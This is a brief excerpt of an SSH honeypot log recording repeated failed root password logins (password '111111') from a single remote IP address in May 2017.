+2017-05-03T21:13:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:58+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:58+0000 [-] unauthorized login: 
+2017-05-03T21:13:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12370
+2017-05-03T21:13:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:14:00+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:14:00+0000 [-] unauthorized login: 
+2017-05-03T21:14:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:14:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12371
+2017-05-03T21:14:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
